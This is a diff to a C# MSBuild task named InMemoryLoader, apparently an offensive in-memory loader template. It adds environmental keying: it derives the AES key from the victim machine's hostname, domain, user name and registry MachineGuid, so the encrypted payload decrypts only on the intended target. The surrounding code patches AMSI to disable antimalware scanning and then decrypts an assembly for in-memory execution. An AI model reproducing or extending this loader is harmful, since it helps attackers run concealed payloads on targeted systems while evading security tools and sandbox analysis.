@@ -20,6 +20,7 @@ using System;
 using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
+using System.Text;
 using Microsoft.Build.Framework;
 using Microsoft.Build.Utilities;
 
@@ -91,9 +92,58 @@ public class InMemoryLoader : Task
         }
     }
 
+    static byte[] DeriveKey(string saltB64, string keying)
+    {
+        byte[] salt = Convert.FromBase64String(saltB64);
+        string[] props = keying.Split(new char[] { ',' }, StringSplitOptions.RemoveEmptyEntries);
+        Array.Sort(props);
+
+        StringBuilder sb = new StringBuilder();
+        foreach (string prop in props)
+        {
+            string p = prop.Trim().ToLowerInvariant();
+            string val = "";
+            if (p == "hostname")
+                val = Environment.MachineName;
+            else if (p == "domain")
+                val = Environment.UserDomainName;
+            else if (p == "user")
+                val = Environment.UserName;
+            else if (p == "machineguid")
+            {
+                try
+                {
+                    using (var rk = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(
+                        "SOFTWARE\\Microsoft\\Cryptography"))
+                    {
+                        if (rk != null)
+                            val = rk.GetValue("MachineGuid", "").ToString();
+                    }
+                }
+                catch { }
+            }
+            sb.Append(p).Append("=").Append(val.ToUpperInvariant()).Append("\n");
+        }
+
+        byte[] data = Encoding.UTF8.GetBytes(sb.ToString());
+        byte[] combined = new byte[salt.Length + data.Length];
+        Buffer.BlockCopy(salt, 0, combined, 0, salt.Length);
+        Buffer.BlockCopy(data, 0, combined, salt.Length, data.Length);
+
+        using (SHA256 sha = SHA256.Create())
+        {
+            byte[] result = sha.ComputeHash(combined);
+            Array.Clear(combined, 0, combined.Length);
+            Array.Clear(data, 0, data.Length);
+            return result;
+        }
+    }
+
     static string ENCRYPTED_B64 = "YOURPAYLOADHERE";
     static string KEY_B64 = "YOURKEYHERE";
     static string IV_B64 = "YOURIVHERE";
+    static string KEYING = "YOURKEYINGHERE";
+    static string SALT_B64 = "YOURSALTHERE";
 
     static string TARGET_TYPE = "YOURTYPEHERE";
     static string TARGET_METHOD = "YOURMETHODHERE";
@@ -121,9 +171,24 @@ public class InMemoryLoader : Task
             PatchAmsi();
 
             byte[] encrypted = Convert.FromBase64String(ENCRYPTED_B64);
-            byte[] key = Convert.FromBase64String(KEY_B64);
+            byte[] key;
+            if (KEYING.Length > 0)
+                key = DeriveKey(SALT_B64, KEYING);
+            else
+                key = Convert.FromBase64String(KEY_B64);
             byte[] iv = Convert.FromBase64String(IV_B64);
-            byte[] clearAssembly = AesDecrypt(encrypted, key, iv);
+
+            byte[] clearAssembly;
+            try
+            {
+                clearAssembly = AesDecrypt(encrypted, key, iv);
+            }
+            catch (CryptographicException)
+            {
+                Console.Error.WriteLine("Decryption failed -- key mismatch (wrong target?)");
+                return true;
+            }
+
             Array.Clear(encrypted, 0, encrypted.Length);
             Array.Clear(key, 0, key.Length);
             Array.Clear(iv, 0, iv.Length);
